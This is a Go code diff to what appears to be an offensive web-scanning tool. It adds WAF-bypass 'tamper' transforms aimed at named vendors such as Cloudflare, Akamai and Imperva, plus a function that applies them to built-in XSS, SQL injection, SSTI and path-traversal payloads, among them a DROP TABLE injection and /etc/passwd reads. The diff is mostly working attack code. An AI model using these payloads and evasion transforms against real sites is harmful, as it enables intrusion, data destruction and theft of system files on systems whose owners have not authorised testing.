@@ -297,6 +297,55 @@ Description: "Insert null bytes between chars",
 Vendors:     []WAFVendor{WAFModSec, WAFUnknown},
 Fn:          nullByte,
 },
+// ── 2025 New Tampers ──────────────────────────────────────────────────
+{
+Name:        "space2tab",
+Description: "Replace spaces with tab characters",
+Vendors:     []WAFVendor{WAFCloudflare, WAFAkamai, WAFUnknown},
+Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "\t") },
+},
+{
+Name:        "space2newline",
+Description: "Replace spaces with newline+space (MySQL comment bypass)",
+Vendors:     []WAFVendor{WAFModSec, WAFImperva, WAFUnknown},
+Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "\n") },
+},
+{
+Name:        "hex2char",
+Description: "Convert string literals to hex (0x41 = 'A')",
+Vendors:     []WAFVendor{WAFCloudflare, WAFSucuri, WAFUnknown},
+Fn:          hexEncode,
+},
+{
+Name:        "concat2concatws",
+Description: "Replace CONCAT with CONCAT_WS to bypass keyword filters",
+Vendors:     []WAFVendor{WAFAkamai, WAFImperva, WAFUnknown},
+Fn:          func(p string) string { return strings.ReplaceAll(p, "CONCAT(", "CONCAT_WS(0x20,") },
+},
+{
+Name:        "ifnull2ifisnull",
+Description: "Replace IFNULL with IF(ISNULL())",
+Vendors:     []WAFVendor{WAFModSec, WAFUnknown},
+Fn:          func(p string) string { return strings.ReplaceAll(p, "IFNULL(", "IF(ISNULL(") },
+},
+{
+Name:        "xss_unicode",
+Description: "Unicode escape XSS payloads",
+Vendors:     []WAFVendor{WAFCloudflare, WAFAkamai, WAFUnknown},
+Fn:          xssUnicodeEscape,
+},
+{
+Name:        "xss_htmlentity",
+Description: "HTML entity encode XSS angle brackets",
+Vendors:     []WAFVendor{WAFImperva, WAFSucuri, WAFUnknown},
+Fn:          xssHtmlEntity,
+},
+{
+Name:        "xss_jsstring",
+Description: "JS string escape for XSS in attribute context",
+Vendors:     []WAFVendor{WAFCloudflare, WAFUnknown},
+Fn:          xssJSString,
+},
 }
 }
 
@@ -569,3 +618,107 @@ return a
 return b
 }
 
+
+// ─── 2025 New Tamper Implementations ─────────────────────────────────────────
+
+func hexEncode(p string) string {
+	var sb strings.Builder
+	for _, c := range p {
+		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
+			sb.WriteString(fmt.Sprintf("0x%X", c))
+		} else {
+			sb.WriteRune(c)
+		}
+	}
+	return sb.String()
+}
+
+func xssUnicodeEscape(p string) string {
+	replacer := strings.NewReplacer(
+		"<", `\u003c`,
+		">", `\u003e`,
+		"'", `\u0027`,
+		"\"", `\u0022`,
+		"/", `\u002f`,
+	)
+	return replacer.Replace(p)
+}
+
+func xssHtmlEntity(p string) string {
+	replacer := strings.NewReplacer(
+		"<", "&#60;",
+		">", "&#62;",
+		"'", "&#39;",
+		"\"", "&#34;",
+		"(", "&#40;",
+		")", "&#41;",
+	)
+	return replacer.Replace(p)
+}
+
+func xssJSString(p string) string {
+	replacer := strings.NewReplacer(
+		"<", `\x3c`,
+		">", `\x3e`,
+		"'", `\'`,
+		"\"", `\"`,
+		"\n", `\n`,
+		"\r", `\r`,
+	)
+	return replacer.Replace(p)
+}
+
+// GetBypassPayloadsForVuln returns WAF-bypassed payloads for a specific vuln type.
+// Used by hunt/abhimanyu to automatically apply bypass when WAF is detected.
+func GetBypassPayloadsForVuln(vulnType string, vendor WAFVendor) []string {
+	tampers := GetTampersForVendor(vendor)
+
+	basePayloads := map[string][]string{
+		"xss": {
+			`<script>alert(1)</script>`,
+			`<img src=x onerror=alert(1)>`,
+			`<svg onload=alert(1)>`,
+			`javascript:alert(1)`,
+			`"><script>alert(1)</script>`,
+		},
+		"sqli": {
+			`' OR '1'='1`,
+			`' UNION SELECT 1,2,3--`,
+			`1; DROP TABLE users--`,
+			`' AND SLEEP(5)--`,
+			`1' ORDER BY 1--`,
+		},
+		"ssti": {
+			`{{7*7}}`,
+			`${7*7}`,
+			`<%= 7*7 %>`,
+			`#{7*7}`,
+			`*{7*7}`,
+		},
+		"lfi": {
+			`../../../etc/passwd`,
+			`....//....//....//etc/passwd`,
+			`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
+		},
+	}
+
+	base, ok := basePayloads[strings.ToLower(vulnType)]
+	if !ok {
+		return nil
+	}
+
+	var result []string
+	result = append(result, base...) // always include originals
+
+	// Apply each tamper to each base payload
+	for _, tamper := range tampers[:wafMin(len(tampers), 5)] {
+		for _, payload := range base {
+			transformed := tamper.Fn(payload)
+			if transformed != payload {
+				result = append(result, transformed)
+			}
+		}
+	}
+
+	return result
+}
